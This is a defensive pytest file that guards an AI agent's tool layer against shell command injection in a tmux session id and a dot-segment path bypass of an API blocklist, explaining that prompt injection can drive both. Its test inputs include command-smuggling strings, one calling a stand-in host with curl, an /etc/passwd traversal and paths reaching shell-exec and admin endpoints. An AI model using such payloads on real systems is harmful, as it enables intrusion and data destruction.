"""Guards for two injection defects in the agent tool layer.

Both were reachable from MODEL-controlled tool arguments, which are untrusted
input (prompt injection can drive them).

1. src/tools/cookbook.py built the remote tmux command by interpolating
   shlex.quote(session_id) INSIDE a hand-written '...' literal. quote() supplies
   its own single quotes, so they terminated the surrounding literal and left the
   payload unquoted in the LOCAL shell string that is POSTed to /api/shell/exec:
       session_id = "x; touch /tmp/pwned"
   produced  ssh host 'tmux kill-session -t 'x; touch /tmp/pwned''  -> the `;`
   ended the ssh command and ran the rest locally.

2. src/tools/system.py do_app_api tested its blocklist with startswith() on the
   RAW path, but httpx applies RFC 3986 dot-segment removal when building the
   URL — so the guard and the actual request saw different paths and
   "/api/cookbook/../shell/exec" reached /api/shell/exec.
"""
import asyncio
import json

import pytest


def _run(coro):
    return asyncio.run(coro)


# ---- 1. cookbook tmux session id ------------------------------------------

@pytest.mark.parametrize(
    "malicious",
    [
        "x; touch /tmp/pwned",
        "x$(id > /tmp/marker)",
        "x`id`",
        "x'; echo hi; '",
        "x && curl evil.example.com",
        "x | tee /tmp/out",
        "../../etc/passwd",
        "x\nnewline",
    ],
)
def test_kill_session_rejects_shell_metacharacters(malicious):
    """The id must be rejected BEFORE any shell string is built, so quoting
    mistakes downstream can never become command execution."""
    from src.tools.cookbook import _cookbook_kill_session

    result = _run(_cookbook_kill_session(malicious))
    assert result.get("exit_code") == 1
    assert "Invalid session_id format" in (result.get("error") or "")


def test_kill_session_command_uses_a_single_quoting_level():
    """The remote command must be quoted ONCE as a whole argument rather than
    having shlex.quote() nested inside a literal '...' block."""
    source = __import__("inspect").getsource(
        __import__("src.tools.cookbook", fromlist=["_cookbook_kill_session"])._cookbook_kill_session
    )
    # The unsafe shape: a quote() call sitting inside a single-quoted literal.
    assert "'tmux kill-session -t {shlex.quote" not in source
    assert "shlex.quote(_remote_cmd)" in source


# ---- 2. app_api path blocklist --------------------------------------------

@pytest.mark.parametrize(
    "path",
    [
        "/api/cookbook/../shell/exec",
        "/api/./shell/exec",
        "/api/shell/../shell/exec",
        "/api/foo/bar/../../shell/exec",
        "/api/x/../auth/login",
        "/api/x/../admin/wipe",
    ],
)
def test_app_api_blocks_dot_segment_paths_into_blocked_prefixes(path):
    """Dot segments must be canonicalized BEFORE the blocklist, so a path that
    httpx would resolve into a blocked prefix is rejected."""
    from src.tools.system import do_app_api

    result = _run(do_app_api(json.dumps({"action": "call", "path": path, "method": "POST"})))
    assert result.get("exit_code") == 1
    assert "blocked for safety" in (result.get("error") or "").lower()


def test_app_api_still_allows_an_ordinary_path():
    """The normalization must not reject legitimate paths. This one is allowed by
    the blocklist, so it proceeds past the guards (the loopback request itself
    then fails in the test environment — which is fine; we only assert that it
    was NOT rejected as blocked)."""
    from src.tools.system import do_app_api

    result = _run(do_app_api(json.dumps({"action": "call", "path": "/api/cookbook/gpus"})))
    assert "blocked for safety" not in (result.get("error") or "").lower()
